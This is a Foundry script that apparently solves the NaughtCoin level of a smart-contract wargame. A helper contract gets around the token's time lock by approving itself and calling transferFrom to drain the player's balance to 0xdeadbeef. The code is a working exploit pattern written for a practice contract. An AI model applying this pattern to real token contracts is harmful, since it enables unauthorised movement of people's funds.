// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {NaughtCoin} from "../src/15_NaughtCoin.sol";
import {Script, console} from "forge-std/Script.sol";

contract NaughtCoinSolve is Script {
    NaughtCoin coin = NaughtCoin(0xb7A88Cec35c432597530536D0B50CAC64aBd3B8F);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        Attack attack = new Attack();
        coin.approve(address(attack), type(uint256).max);
        attack.pwn(address(coin));

        vm.stopBroadcast();
    }
}

contract Attack {
    function pwn(address coinAddress) external {
        NaughtCoin coin = NaughtCoin(coinAddress);
        console.log("Token Balance Before#", coin.balanceOf(msg.sender));
        (bool success) = coin.transferFrom(msg.sender, address(0xdeadbeef), coin.balanceOf(msg.sender));
        require(success, "Token Transfer Failed");
        console.log("Token Balance After#", coin.balanceOf(msg.sender));
    }
}
